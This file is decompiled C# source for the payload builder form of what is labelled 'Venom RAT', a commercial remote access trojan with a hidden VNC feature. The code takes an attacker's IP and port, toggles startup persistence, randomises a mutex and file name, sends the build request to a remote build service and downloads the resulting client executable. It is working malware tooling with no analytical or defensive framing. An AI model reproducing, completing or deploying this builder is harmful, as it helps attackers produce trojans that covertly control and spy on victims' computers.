using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using HVNC.Utils;
using HVNC.WebBuilder;
using Siticone.Desktop.UI.WinForms;

namespace HVNC
{
	// Token: 0x02000015 RID: 21
	public partial class FrmBuilder : Form
	{
		// Token: 0x0600008F RID: 143 RVA: 0x0000236A File Offset: 0x0000056A
		public FrmBuilder()
		{
			this.InitializeComponent();
		}

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x06000090 RID: 144 RVA: 0x00002378 File Offset: 0x00000578
		// (set) Token: 0x06000091 RID: 145 RVA: 0x0000237F File Offset: 0x0000057F
		public static string pathtosave { get; set; }

		// Token: 0x06000092 RID: 146 RVA: 0x00006D48 File Offset: 0x00004F48
		private void button1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.txtIP.Text == "IP ADDRESS")
				{
					MessageBox.Show("IP or DNS is required in order to build.", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					using (FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog())
					{
						if (folderBrowserDialog.ShowDialog() == DialogResult.OK && !string.IsNullOrWhiteSpace(folderBrowserDialog.SelectedPath))
						{
							Directory.GetFiles(folderBrowserDialog.SelectedPath);
							FrmBuilder.pathtosave = folderBrowserDialog.SelectedPath.ToString() + "\\";
						}
					}
					if (string.IsNullOrWhiteSpace(this.txtIP.Text) || string.IsNullOrWhiteSpace(this.txtPORT.Text))
					{
						MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						this.BuildBtn.Text = "Building...";
						this.BuildBtn.Enabled = false;
						BuildInfo.ip = this.txtIP.Text;
						BuildInfo.port = this.txtPORT.Text;
						BuildInfo.id = "VenomHVNC";
						BuildInfo.mutex = FrmBuilder.RandomMutex(9) + ".exe";
						BuildInfo.startup = "False";
						BuildInfo.hhvnc = "True";
						if (this.EnableStartUpBox.Checked)
						{
							BuildInfo.startup = "True";
						}
						else if (!this.EnableStartUpBox.Checked)
						{
							BuildInfo.startup = "False";
						}
						BuildInfo.path = "1";
						BuildInfo.folder = this.textBox2.Text;
						BuildInfo.filename = this.textBox2.Text;
						BuildInfo.wdex = "False";
						string a = WebBuilder.SendBuild(BuildInfo.ip, BuildInfo.port, BuildInfo.id, BuildInfo.mutex, BuildInfo.startup, BuildInfo.path, BuildInfo.folder, BuildInfo.filename, BuildInfo.wdex, BuildInfo.hhvnc);
						if (a == "success")
						{
							using (WebClient webClient = new WebClient())
							{
								if (File.Exists(Directory.GetCurrentDirectory() + "\\ClientH.exe"))
								{
									File.Delete(Directory.GetCurrentDirectory() + "\\ClientH.exe");
								}
								Thread.Sleep(3500);
								webClient.DownloadFile(WebBuilder.DownloadURL + WebBuilder.Username + "/Client.exe", FrmBuilder.pathtosave + "ClientH.exe");
								WebBuilder.DeleteOldBuild();
								MessageBox.Show("Build Success", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
								this.BuildBtn.Enabled = true;
								this.BuildBtn.Text = "Build HVNC";
								goto IL_2E4;
							}
						}
						if (a == "invalid-arguments")
						{
							MessageBox.Show("Error Connecting to server!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
							this.BuildBtn.Enabled = true;
						}
						else if (a == "missing-args")
						{
							MessageBox.Show("Error Building Error Code: 4004");
							this.BuildBtn.Enabled = true;
						}
						else if (a == "invalid-user-or-expired")
						{
							Environment.Exit(Environment.ExitCode);
						}
					}
				}
				IL_2E4:;
			}
			catch (Exception ex)
			{
				if (ex.ToString().Contains("403"))
				{
					MessageBox.Show("Server Blocks Your IP!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					MessageBox.Show("Error Building HVNC", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00002387 File Offset: 0x00000587
		private void FrmBuilder_Load(object sender, EventArgs e)
		{
			this.textBox2.Text = FrmBuilder.RandomMutex(8);
			this.txtIP.Text = FrmBuilder.GetLocalIPAddress();
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000023AA File Offset: 0x000005AA
		public static string RandomMutex(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
			select s[FrmBuilder.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000023E5 File Offset: 0x000005E5
		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("0123456789", length)
			select s[FrmBuilder.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000096 RID: 150 RVA: 0x000070C4 File Offset: 0x000052C4
		public static string GetLocalIPAddress()
		{
			foreach (IPAddress ipaddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
			{
				if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return ipaddress.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		// Token: 0x04000039 RID: 57
		public static byte[] b;

		// Token: 0x0400003A RID: 58
		public static Random r = new Random();

		// Token: 0x0400003C RID: 60
		public static Random random = new Random();
	}
}
